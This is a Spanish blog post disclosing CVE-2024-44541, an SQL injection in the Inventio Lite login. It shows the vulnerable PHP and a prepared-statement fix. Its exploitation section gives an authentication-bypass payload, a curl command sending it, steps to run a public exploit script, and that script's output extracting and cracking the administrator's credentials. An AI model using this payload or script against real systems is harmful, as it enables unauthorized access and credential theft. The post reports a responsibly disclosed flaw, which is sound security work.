+++
author = "Andrés Del Cerro"
title = "Mi primer CVE - CVE-2024-44541"
date = "2024-08-03"
description = ""
tags = [
    "Cybersecurity",
    "Penetration Testing",
    "Web Hacking",
    "CVE",
    "Informative",
    "CVE-2024-44541"
]

+++

# Introducción:

Recientemente, descubrí mi primer CVE, un hito importante en mi trayectoria en ciberseguridad. Aquí comparto brevemente el proceso.
¿Qué es un CVE?

CVE (Common Vulnerabilities and Exposures) es un sistema que identifica y categoriza vulnerabilidades de seguridad en software, permitiendo que se reporte y solucione de manera coordinada.
El Descubrimiento

---

# Código Vulnerable

El código vulnerable se encuentra en el archivo de login, donde la entrada del usuario no se escapa adecuadamente antes de ser incluida en la consulta SQL:
```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();
    $sql = "select * from user where (email= \"".$user."\" or username= \"".$user."\") and password= \"".$pass."\" and is_active=1";
    $query = $con->query($sql);
    $found = false;
    $userid = null;
    while($r = $query->fetch_array()){
        $found = true;
        $userid = $r['id'];
    }
}
```
En esta implementación, el parámetro `username` se concatena directamente en la consulta SQL, permitiendo la inyección de código malicioso.

---

# Código Corregido
La vulnerabilidad se solucionó utilizando consultas **preparadas**, que permiten escapar adecuadamente las entradas del usuario y evitar la inyección SQL:
```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();

    // Preparar la consulta
    $stmt = $con->prepare("
        SELECT * FROM user 
        WHERE (email = ? OR username = ?) 
        AND password = ? 
        AND is_active = 1
    ");

    // Vincular los parámetros
    $stmt->bind_param("sss", $user, $user, $pass);

    // Ejecutar la consulta
    $stmt->execute();

    // Obtener los resultados
    $result = $stmt->get_result();
    $found = false;
    $userid = null;

    while($r = $result->fetch_assoc()){
        $found = true;
        $userid = $r['id'];
    }

    // Cerrar la declaración
    $stmt->close();
}
```

---

# Explotación
## Payload de Bypass de Autenticación
Un atacante puede explotar esta vulnerabilidad utilizando un payload como el siguiente para eludir la autenticación:
```text
username -> ") or 1=1-- -
password -> cualquier_valor
```

**Ejemplo de explotación con** `curl`:
```console
$ curl -X POST http://URL_INVENTIO_LITE/inventio-lite/?action=processlogin -d 'username=%22%29%20or%201%3D1--%20-&password=blablabla' -v && echo ""
```

# Script de Explotación Automática
He desarrollado un script en Python que automatiza la extracción del nombre de usuario y hash de la contraseña del administrador, y luego intenta descifrar la contraseña.

Para usar el script, clona el repositorio y ejecuta el script:

```console
$ git clone https://github.com/pointedsec/CVE-2024-44541
$ pip install -r requirements.txt
$ python3 sqli.py
```
**Ejemplo de salida del script**
```console
[*] Checking if target is vulnerable
[+] Target Vulnerable!
[*] Dumping Administrator username...
[◤] Extracting Username: -> POINTEDSEC@GMAIL.COM
[/] Extracting Admin Password Hash: Final Admin Hash: 90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad
[+] Password Decrypted! -> POINTEDSEC@GMAIL.COM:admin
```

---

# Impacto
La explotación de esta vulnerabilidad puede tener las siguientes consecuencias:
- **Confidencialidad**: Los atacantes pueden extraer toda la base de datos, accediendo a información sensible como credenciales de usuarios, correos electrónicos y otros datos personales.
- **Integridad**: Un atacante podría obtener acceso administrativo, permitiendo modificar, agregar o eliminar datos en la aplicación.

---
#Referencias

- [Inventio Lite GitHub Repository](https://github.com/evilnapsis/inventio-lite)
- [CVE-2024-44541 en MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44541)
- [Alerta en INCIBE](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-44541)
- [Detalle en NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-44541)

---

# Créditos
Este CVE fue descubierto y reportado por Andrés Del Cerro (alias: pointedsec, yo jejeje). Si necesitas más información, no dudes en contactarme a través de pointedpentesting@gmail.com.

---

# Conclusión
Después de validar la vulnerabilidad, procedí con su divulgación responsable, colaborando con el equipo de seguridad afectado para resolverla.

Descubrir y reportar un CVE ha sido una experiencia educativa, reforzando mi enfoque en la seguridad informática y motivándome a seguir contribuyendo a este campo.

Happy Hacking! 🚀